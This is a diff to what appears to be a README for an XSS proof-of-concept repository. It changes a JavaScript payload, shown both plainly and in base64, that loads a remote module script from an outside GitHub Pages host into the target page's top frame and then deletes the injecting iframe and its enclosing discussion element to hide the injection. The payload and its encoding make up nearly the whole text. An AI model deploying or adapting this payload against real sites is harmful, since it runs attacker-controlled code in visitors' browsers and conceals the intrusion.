@@ -8,11 +8,11 @@ The payload I used for this repo is:
 ```
 with the executed payload (which is in base64 for various reasons) being 
 ```
-let a = document.createElement('script'); a.type = "module"; a.src = 'https://existencing.github.io/mb.js'; top.document.head.appendChild(a); document.getElementById("discussion-payload-iframe").remove(); let b = document.getElementById("discussion-payload-iframe"); let discussions = document.getElementsByClassName("discussion"); while (Object.values(discussions).indexOf(b) === -1) { b = b.parentNode;}; b.remove();
+let a = document.createElement('script'); a.type = "module"; a.src = 'https://existencing.github.io/xss/mb.js'; top.document.head.appendChild(a); document.getElementById("discussion-payload-iframe").remove(); let b = document.getElementById("discussion-payload-iframe"); let discussions = document.getElementsByClassName("discussion"); while (Object.values(discussions).indexOf(b) === -1) { b = b.parentNode;}; b.remove();
 ```
 which in base 64 is
 ```
-bGV0IGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7IGEuc3JjID0gJ2h0dHBzOi8vZXhpc3RlbmNpbmcuZ2l0aHViLmlvL21iLmpzJzsgdG9wLmRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoYSk7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkaXNjdXNzaW9uLXBheWxvYWQtaWZyYW1lIikucmVtb3ZlKCk7IGxldCBiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRpc2N1c3Npb24tcGF5bG9hZC1pZnJhbWUiKTsgbGV0IGRpc2N1c3Npb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgiZGlzY3Vzc2lvbiIpOyB3aGlsZSAoT2JqZWN0LnZhbHVlcyhkaXNjdXNzaW9ucykuaW5kZXhPZihiKSA9PT0gLTEpIHsgYiA9IGIucGFyZW50Tm9kZTt9OyBiLnJlbW92ZSgpOw==
+bGV0IGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgYS50eXBlID0gIm1vZHVsZSI7IGEuc3JjID0gJ2h0dHBzOi8vZXhpc3RlbmNpbmcuZ2l0aHViLmlvL3hzcy9tYi5qcyc7IHRvcC5kb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGlzY3Vzc2lvbi1wYXlsb2FkLWlmcmFtZSIpLnJlbW92ZSgpOyBsZXQgYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkaXNjdXNzaW9uLXBheWxvYWQtaWZyYW1lIik7IGxldCBkaXNjdXNzaW9ucyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoImRpc2N1c3Npb24iKTsgd2hpbGUgKE9iamVjdC52YWx1ZXMoZGlzY3Vzc2lvbnMpLmluZGV4T2YoYikgPT09IC0xKSB7IGIgPSBiLnBhcmVudE5vZGU7fTsgYi5yZW1vdmUoKTs=
 ```
 # Functioning of code
 1. Using XSS payload, inject a script into top frame of document (i.e target website)
